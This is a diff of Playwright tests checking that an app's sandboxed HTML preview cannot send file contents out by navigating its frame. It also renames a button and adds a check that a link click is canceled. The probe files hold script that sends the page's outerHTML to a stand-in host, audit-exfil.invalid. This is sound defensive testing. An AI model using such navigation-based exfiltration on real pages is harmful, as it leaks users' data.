@@ -9,7 +9,7 @@ test('an HTML preview cannot send its contents by navigating its own frame', asy
     'preview-probe.html',
     '<!doctype html><html><body><h1>AUDIT_ONLY_CONTENT</h1><script>location.href = "https://audit-exfil.invalid/capture?d=" + encodeURIComponent(document.documentElement.outerHTML)</script></body></html>',
   );
-  await page.getByRole('button', { name: 'Review', exact: true }).click();
+  await page.getByRole('button', { name: 'Side panel', exact: true }).click();
   await page.getByRole('tab', { name: 'Files', exact: true }).click();
   await page
     .getByRole('treeitem', { name: 'preview-probe.html', exact: true })
@@ -66,7 +66,7 @@ for (const width of [1440, 414]) {
       ['same-host', 'location.href = destination', sameHost],
       [
         'link',
-        'const link = document.createElement("a"); link.href = destination; document.body.append(link); link.click()',
+        'const link = document.createElement("a"); link.href = destination; document.body.append(link); link.addEventListener("click", event => link.dataset.canceled = String(event.defaultPrevented)); link.click()',
         'https://audit-exfil.invalid/capture',
       ],
       [
@@ -84,13 +84,30 @@ for (const width of [1440, 414]) {
       const path = `preview-${name}.html`;
       await page.keyboard.press('Alt+1');
       await page.getByRole('treeitem', { name: path, exact: true }).click();
-      await expect
-        .poll(() =>
-          page
-            .frames()
-            .some((frame) => frame.url() === 'chrome-error://chromewebdata/'),
-        )
-        .toBe(true);
+      if (name === 'link') {
+        const preview = page
+          .getByLabel(`${path} HTML preview`, { exact: true })
+          .contentFrame()
+          .getByLabel('Preview content', { exact: true })
+          .contentFrame();
+        await expect(
+          preview.getByRole('link', { name: '', exact: true }),
+        ).toHaveAttribute('data-canceled', 'true');
+        await expect(
+          preview.getByRole('heading', {
+            name: 'AUDIT_ONLY_CONTENT',
+            exact: true,
+          }),
+        ).toBeVisible();
+      } else {
+        await expect
+          .poll(() =>
+            page
+              .frames()
+              .some((frame) => frame.url() === 'chrome-error://chromewebdata/'),
+          )
+          .toBe(true);
+      }
       await expect.poll(() => previewRequests.requests).toEqual([]);
       await page.getByRole('tab', { name: 'Source', exact: true }).click();
       await expect(
@@ -122,7 +139,9 @@ for (const width of [1440, 414]) {
     try {
       await app.open(await app.link('this'));
       if (width === 414) {
-        await page.getByRole('button', { name: 'Review', exact: true }).click();
+        await page
+          .getByRole('button', { name: 'Side panel', exact: true })
+          .click();
         await page.getByRole('tab', { name: 'Files', exact: true }).click();
       }
       await expect((await initialDirectory).json()).resolves.toMatchObject({
